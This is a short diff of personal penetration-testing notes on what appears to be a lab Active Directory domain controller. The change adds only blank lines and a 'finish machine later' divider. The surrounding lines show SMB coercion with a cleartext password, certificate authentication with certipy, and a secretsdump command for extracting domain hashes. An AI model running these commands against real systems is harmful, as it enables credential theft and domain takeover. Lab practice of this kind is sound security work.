@@ -812,6 +812,14 @@ nxc smb dc01.shadow.gate -u 'bbrown' -p '12345678' -M coerce\_plus -o LISTENER=1
 
 maybe can use [penelope.py](http://penelope.py) here?
 
+
+
+
+
+\---------------------------------FINISH MACHINE LATER-------------------------------------------
+
+&#x20;
+
 DC01 Privilege Escalation
 
 `certipy-ad auth -pfx DC01.shadow.gate.pfx -dc-ip 10.1.4.86`
@@ -819,3 +827,6 @@ DC01 Privilege Escalation
 ![image.png](attachment:067f94ee-f248-43c1-9b6d-1214f58b58e0:image.png)
 
 `secretsdump.py 'shadow.gate'/'DC01$'@DC01.SHADOW.GATE -hashes : insert here`
+
+
+
